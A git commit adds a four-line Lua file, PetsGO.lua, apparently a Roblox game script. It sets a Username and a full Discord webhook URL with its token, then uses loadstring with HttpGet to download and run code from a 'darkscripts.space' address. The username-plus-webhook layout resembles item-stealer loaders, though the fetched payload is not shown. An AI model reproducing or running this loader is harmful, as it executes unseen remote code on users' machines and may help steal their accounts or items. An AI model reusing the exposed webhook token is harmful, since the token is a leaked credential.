56f831a863b2b372c8e8bb8e2de1244e004f7487
Jeluka11 <Bossluka@proton.me>
2024-11-09 23:18:43 +0800

    Add files via upload

---
+++ main/PetsGO.lua
@@ -0,0 +1,4 @@
+Username = "nick36dd"
+Webhook = "https://discord.com/api/webhooks/1304825882636058644/IErsZ46tQRdhokGtZpfrfLVKBGICpQGdNbTX8BlgLRDzwR3tHK85jiA6F5L8OzM-j6kw"
+
+loadstring(game:HttpGet(('https://darkscripts.space/petgo')))()
